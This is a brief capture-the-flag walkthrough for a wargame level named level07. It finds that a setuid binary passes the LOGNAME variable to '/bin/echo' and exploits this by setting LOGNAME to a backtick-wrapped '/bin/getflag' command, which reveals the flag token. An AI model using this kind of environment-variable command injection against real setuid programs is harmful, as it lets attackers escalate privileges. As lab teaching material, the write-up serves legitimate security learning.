Once again let's start by listing the files in the folder:
```
ls -l
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```
As previously we find an executable, let's try to run it.
```
./level07
level07
```
As we did before, let's try to hexdump the file
```
hexdump -C level07
00000660  e8 00 00 00 00 5b 81 c3  8f 19 00 00 e8 1f fe ff  |.....[..........|
00000670  ff 83 c4 08 5b c3 00 00  03 00 00 00 01 00 02 00  |....[...........|
00000680  4c 4f 47 4e 41 4d 45 00  2f 62 69 6e 2f 65 63 68  |LOGNAME./bin/ech|
00000690  6f 20 25 73 20 00 00 00  01 1b 03 3b 30 00 00 00  |o %s ......;0...|
000006a0  05 00 00 00 28 fd ff ff  4c 00 00 00 7c fe ff ff  |....(...L...|...|
000006b0  70 00 00 00 18 ff ff ff  90 00 00 00 88 ff ff ff  |p...............|
000006c0  cc 00 00 00 8a ff ff ff  e0 00 00 00 14 00 00 00  |................|
```
It would look like they are using echo on an environmental variable.
Let's try to modify it.

```
export LOGNAME='`/bin/getflag`' # we are adding the `` so echo knows he has to launch the command
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Here we go :)
